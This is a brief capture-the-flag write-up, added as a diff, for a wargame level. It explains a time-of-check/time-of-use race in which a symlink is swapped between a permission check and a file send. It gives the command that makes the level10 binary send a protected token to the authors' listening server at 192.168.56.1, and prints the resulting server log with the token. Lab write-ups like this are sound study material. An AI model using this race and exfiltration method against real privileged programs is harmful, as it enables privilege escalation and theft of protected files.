@@ -1,0 +1,18 @@
+We need a server to listen on a port 6969
+Well we did mini_serv for an exam, better put it to some use !
+
+on the VM we found that the file is acces for permission check a lot before it is send
+we just need to change the file in bewteen the check and the send
+using a small script who change a link to a file whe have permission and the token (script_ln.sh)
+while the script is doing it's work we can launch flag10
+`
+	./level10 /tmp/link 192.168.56.1
+`
+
+a client connected to our mini_serv will get the token (may need a few try)
+```
+	server: client 10 just arrived
+	client 10: .*( )*.
+	client 10: woupa2yuojeeaaed06riuj63c
+	server: client 10 just left
+```
